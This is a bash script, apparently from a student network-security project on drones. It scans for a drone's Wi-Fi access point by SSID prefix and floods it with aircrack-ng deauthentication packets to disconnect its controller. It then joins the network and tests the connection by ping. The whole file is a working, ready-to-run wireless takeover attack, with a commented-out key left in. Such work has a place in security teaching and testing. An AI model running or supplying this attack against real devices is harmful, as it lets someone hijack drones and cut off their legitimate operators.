#!/bin/bash

################################################
##      ENSIMAG - Ecole National Superieur    ## 
## d'Informatique et Mathematiques Appliques  ##
##                                            ##
##        Codage et Securite de Reseaux       ##
##                                            ##
##            Securite des Drones             ##
##                                            ##
##                  CLAURE CABRERA Oscar Mike ##
##                  DOYEN-LE BOULAIRE Marine  ##
################################################

echo -e "\n\t***********************"
echo -e "\t*   Drone Security    * "
echo -e "\t***********************"

status=0
name="AP_Te" #
delay_new_search=10
n_ping=5
address_to_ping="192.168.1.253"



airmon="airmon-ng"
airodump="airodump-ng"
aireplay="aireplay-ng"
jamming_packages=50


echo -e "\n\n Looking for an AP with: $name* as SSID"

# Boucle pour trouver le signal du drone
while [  $status = 0 ]; do

	# On scan et on fait le parsing avec 'iw scan wlan0'...
	sudo ./iwScanParser.sh

	if (cat iwScan_Results.WSP | grep $name); then
		SSID_target=`cat iwScan_Results.WSP | grep $name |  awk '{print $3;}'`;
		Channel_target=`cat iwScan_Results.WSP | grep $SSID_target |  awk '{print $2;}'`;
		SSID_MAC_target=`cat iwScan_Results.WSP | grep $SSID_target |  awk '{print $1;}'`;
			echo -e "An AP with the string '$name' has been found!"
			echo -e " AP:\t\t \e[92m$SSID_target\e[0m"
			echo -e " Channel:\t \e[92m$Channel_target\e[0m"
			echo -e " MAC:\t\t \e[92m$SSID_MAC_target\e[0m"
		status=1 #ca nous aide a sortir du boucle
	else
		echo -e "An AP with the string '$name' has not been found! we will try again in $delay seconds..."
		sleep $delay_new_search
	fi
done

# Une fois qu'on a trouve le AP que nous cherchons
# on essaie de le attacker avec jamming et puis on essaie de nous-connecter

	echo -e "\n Setting wlan0 in monitor mode..."
	sudo $airmon start wlan0

	echo -e "\n Setting down wlan0..."
	sudo ifconfig wlan0 down

	echo -e "\n Targetting wlan0..."
	sudo $airodump -c $Channel_target --bssid $SSID_MAC_target wlan0 &
	sleep 10
	sudo pkill airodump-ng

	echo -e "\n Jamming access point (AP)..."
	#sudo $aireplay -0 $jamming_packages -a $SSID_MAC_target -c 74:E2:F5:0B:8A:A2 wlan0
	sudo $aireplay -0 $jamming_packages -a $SSID_MAC_target wlan0
	
	echo -e "\n Restoring normal mode for wlan0..."
	sudo $airmon stop mon0 > pas_important.txt
	sudo $airmon stop wlan0 > pas_important.txt
	sudo rm pas_important.txt
	sudo ifconfig wlan0 up

	echo -e "\n Disabling Network Manager..."
	sudo service network-manager stop

	echo -e "\n Connecting to $SSID_target..."
	sudo iwconfig wlan0 essid $SSID_target #key s:12ClaurE34

	#echo -e "\n\nSetting static IP address..."
	#ifconfig wlan0 192.168.1.1 netmask 255.255.255.0 up

	echo -e "\n Asking for an IP address (DHCP)..."
	sudo dhclient wlan0 #sudo dhclient -v wlan0

	echo -e "\n Cheking wlan0 config..."
	ifconfig wlan0 | grep "addr:"

	echo -e "\n Pinging to $address_to_ping..."
	if (ping -c$n_ping $address_to_ping | grep "0 received"); then
		echo -e "\e[91m   No connection!!\e[0m"
	else
		echo -e "\e[92m   Connection established\e[0m, now you are connected to: \e[92m$SSID_target\e[0m"
	fi

	echo -e "\n Sleeping for 10 seconds..."
	sleep 10

	echo -e "\n Enabling Network Manager..."
	sudo service network-manager start
	

